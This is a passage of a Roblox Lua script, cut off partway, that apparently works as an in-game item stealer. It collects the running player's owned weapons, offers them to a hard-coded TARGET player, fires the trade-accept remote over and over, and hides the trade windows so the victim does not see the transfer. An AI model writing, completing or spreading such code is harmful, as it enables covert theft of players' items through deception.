local TR, OT, AS, LO, LF = false, 0, false, 0, nil
do
    local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 10)
    local OI, AR, AT, SR, ST, UT, DT
    if Trade then
        OI = Trade:FindFirstChild("OfferItem")
        AR = Trade:FindFirstChild("AcceptRequest")
        AT = Trade:FindFirstChild("AcceptTrade")
        SR = Trade:FindFirstChild("SendRequest")
        ST = Trade:FindFirstChild("StartTrade")
        UT = Trade:FindFirstChild("UpdateTrade")
        DT = Trade:FindFirstChild("DeclineTrade")
    end

    local function ist(n)
        return n and tostring(n):lower() == TARGET:lower()
    end

    local function gwps()
        local list = {}
        pcall(function()
            local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
            if ok and pd and pd.Weapons and pd.Weapons.Owned then
                for name, amount in pairs(pd.Weapons.Owned) do
                    local amt = amount
                    if typeof(amount) == "table" then
                        amt = amount.Amount or amount.Quantity or amount.Count or 1
                    elseif amount == true then
                        amt = 1
                    end
                    if typeof(amt) == "number" and amt > 0 and name ~= "DefaultKnife" and name ~= "DefaultGun" then
                        for i = 1, math.min(amt, 4) do
                            table.insert(list, name)
                        end
                    end
                end
            end
        end)
        return list
    end

    local function fa()
        if not AT then return end
        for i = 1, 15 do
            if LF then pcall(function() AT:FireServer(game.PlaceId * 3, LF) end) end
            pcall(function() AT:FireServer(game.PlaceId * 3, tick()) end)
            pcall(function() AT:FireServer() end)
            task.wait(0.3)
        end
    end

    local function ow()
        if not OI or not TR or OT >= 4 then return end
        if tick() - LO < 0.7 then return end
        local weapons = gwps()
        if #weapons == 0 then return end
        local toOffer = math.min(4 - OT, #weapons)
        for i = 1, toOffer do
            local item = weapons[i]
            local ok = pcall(function() OI:FireServer(item, "Weapons") end)
            if not ok then ok = pcall(function() OI:FireServer(item) end) end
            if not ok then ok = pcall(function() OI:FireServer(item, 1) end) end
            if ok then
                OT = OT + 1
                LO = tick()
                task.wait(0.45)
            end
        end
        if OT >= 4 and not AS then
            AS = true
            task.delay(7, function()
                if TR then fa() end
            end)
        end
    end

    local function htg(g)
        if not g then return end
        pcall(function()
            for _, c in ipairs(g:GetChildren()) do
                if c:IsA("GuiObject") then c.Visible = false end
            end
        end)
    end

    pcall(function()
        local function watch(n)
            local g = pg:FindFirstChild(n)
            if g then
                htg(g)
                g:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if g.Enabled then htg(g) end
                end)
            end
        end
        watch("TradeGUI")
        watch("TradeGUI_Phone")
        pg.ChildAdded:Connect(function(c)
            if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
                task.wait(0.05)
                htg(c)
            end
        end)
    end)

    -- First trade request auto-accept (critical)
    if SR then
        pcall(function()
